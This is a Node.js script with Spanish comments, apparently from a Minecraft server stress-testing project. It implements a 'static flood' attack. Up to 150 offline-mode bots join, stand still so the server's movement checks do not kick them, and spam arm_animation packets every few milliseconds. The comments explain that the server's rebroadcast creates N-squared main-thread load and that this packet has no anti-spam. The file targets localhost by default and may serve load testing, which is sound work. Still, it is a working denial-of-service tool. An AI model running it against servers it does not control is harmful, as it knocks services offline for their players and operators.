// Ataque de inundacion estatica, separado de server_stress.
//
// Los bots entran, confirman el spawn y NO se mueven: no envian mas paquetes de
// posicion, de modo que el servidor no los expulsa por "moved wrongly" ni por
// "flying", que eran lo que acortaba las corridas con movimiento. En su lugar
// inundan arm_animation a alta tasa. El servidor reenvia la animacion a todos
// los jugadores cercanos; con los bots amontonados en el spawn, cada paquete se
// difunde a ~N jugadores, asi que el costo agregado es de orden N^2 en el hilo
// principal, y arm_animation no tiene anti-spam propio.
//
// Uso: node src/packet-storm.mjs --port 25566 --bots 150 --duration 60 --rate-ms 5
// Apunta --port al servidor (25566) para la prueba sin proxy.

import protocol from 'minecraft-protocol';
import { resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { parseArgs } from 'node:util';

const DEFAULTS = { host: '127.0.0.1', port: 25566, version: '26.1' };

function awaitPlay(client, timeoutMs = 25_000) {
  return new Promise((res, rej) => {
    const timer = setTimeout(() => rej(new Error('timeout play')), timeoutMs);
    client.once('playerJoin', () => { clearTimeout(timer); res(); });
    client.once('end', r => { clearTimeout(timer); rej(new Error(`cerrado antes de play: ${r}`)); });
    client.once('error', e => { clearTimeout(timer); rej(e); });
  });
}

export async function packetStorm(options = {}) {
  const { host, port, version } = { ...DEFAULTS, ...options };
  const bots = options.bots ?? 150;
  const durationMs = (options.durationSec ?? 60) * 1000;
  const intervalMs = options.intervalMs ?? 5;   // 5 ms ~ 200 paquetes/s por bot
  const deadline = Date.now() + durationMs;

  let joined = 0;
  let packets = 0;
  let alive = 0;
  const start = performance.now();

  async function oneBot(index) {
    const username = `storm_${index}_${Math.random().toString(36).slice(2, 6)}`;
    const client = protocol.createClient({ host, port, version, username, auth: 'offline', keepAlive: false });
    client.on('error', () => {});
    let open = true;
    client.once('end', () => { open = false; });

    let pos = null;
    client.on('position', data => {
      pos = { x: data.x, y: data.y, z: data.z };
      if (data.teleportId !== undefined) {
        try { client.write('teleport_confirm', { teleportId: data.teleportId }); } catch {}
      }
    });

    try {
      await awaitPlay(client);
    } catch {
      return;
    }
    joined++;

    // Espera la posicion del spawn y confirma estar en el suelo una sola vez.
    const until = Date.now() + 5_000;
    while (open && pos === null && Date.now() < until) {
      await new Promise(r => setTimeout(r, 50));
    }
    if (pos) {
      try {
        client.write('position', { x: pos.x, y: pos.y, z: pos.z, flags: { onGround: true, hasHorizontalCollision: false } });
      } catch {}
    }

    // Inundacion: solo arm_animation, sin mover al jugador.
    while (open && Date.now() < deadline) {
      try {
        client.write('arm_animation', { hand: 'main_hand' });
        packets++;
      } catch {
        break;
      }
      await new Promise(r => setTimeout(r, intervalMs));
    }
    if (open) { alive++; client.end('fin'); }
  }

  await Promise.all(Array.from({ length: bots }, (_, i) => oneBot(i)));
  return {
    attack: 'packet_storm',
    bots, joined, vivosAlFinal: alive, packets,
    elapsedMs: Math.round(performance.now() - start),
    paquetesPorSegundo: Math.round(packets / ((performance.now() - start) / 1000)),
  };
}

async function main() {
  const { values } = parseArgs({ options: {
    host: { type: 'string', default: '127.0.0.1' },
    port: { type: 'string', default: '25566' },
    version: { type: 'string', default: '26.1' },
    bots: { type: 'string' },
    duration: { type: 'string' },
    'rate-ms': { type: 'string' },
    help: { type: 'boolean', default: false },
  } });
  if (values.help) {
    process.stdout.write('uso: node src/packet-storm.mjs --port 25566 --bots 150 --duration 60 --rate-ms 5\n');
    process.exit(0);
  }
  const options = { host: values.host, port: Number(values.port), version: values.version };
  if (values.bots) options.bots = Number(values.bots);
  if (values.duration) options.durationSec = Number(values.duration);
  if (values['rate-ms']) options.intervalMs = Number(values['rate-ms']);

  const summary = await packetStorm(options);
  process.stdout.write(`${JSON.stringify(summary, null, 2)}\n`);
  process.exit(0);
}

if (process.argv[1] && resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  main().catch(e => { process.stderr.write(`error: ${e.message}\n`); process.exit(1); });
}
